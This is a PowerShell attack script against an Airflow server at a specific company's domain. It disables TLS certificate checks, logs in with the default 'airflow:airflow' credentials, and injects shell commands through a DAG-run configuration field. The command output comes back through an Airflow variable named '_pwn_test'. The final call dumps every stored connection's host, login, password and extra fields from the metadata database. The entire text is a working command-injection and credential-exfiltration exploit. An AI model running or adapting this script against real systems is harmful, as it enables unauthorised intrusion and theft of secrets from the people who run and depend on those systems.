Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function Exfil($cmd) {
    $ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
    $inject = '30"; (' + $cmd + ') 2>&1 | head -c 4000 | base64 -w0 | xargs -I{} curl -sk -X PATCH ' + $base + '/api/v1/variables/_pwn_test -H "Authorization: Basic ' + $encoded + '" -H "Content-Type: application/json" -d "{\"key\":\"_pwn_test\",\"value\":\"{}\"}"; echo "'
    $body = @{ conf = @{ maxLogAgeInDays = $inject }; logical_date = $ts } | ConvertTo-Json -Depth 10
    $req = [System.Net.WebRequest]::Create("$base/api/v1/dags/maintenance_logs_cleanup/dagRuns"); $req.Method = "POST"; $req.ContentType = "application/json"
    $req.Headers.Add("Authorization", "Basic $encoded")
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body); $req.ContentLength = $bytes.Length
    $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
    try { $req.GetResponse() | Out-Null } catch {}
    Start-Sleep 15
    $req2 = [System.Net.WebRequest]::Create("$base/api/v1/variables/_pwn_test"); $req2.Headers.Add("Authorization", "Basic $encoded"); $req2.Accept = "application/json"
    $resp = $req2.GetResponse(); $r = New-Object System.IO.StreamReader($resp.GetResponseStream()); $val = ($r.ReadToEnd() | ConvertFrom-Json).value
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($val)) }
    catch { return $val }
}

# Query all connections
Write-Host "=== ALL CONNECTIONS ==="
Write-Host (Exfil "python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); cur=c.cursor(); cur.execute(\"SELECT conn_id,conn_type,host,login,password,port,extra FROM connection\"); [print(r) for r in cur.fetchall()]'")
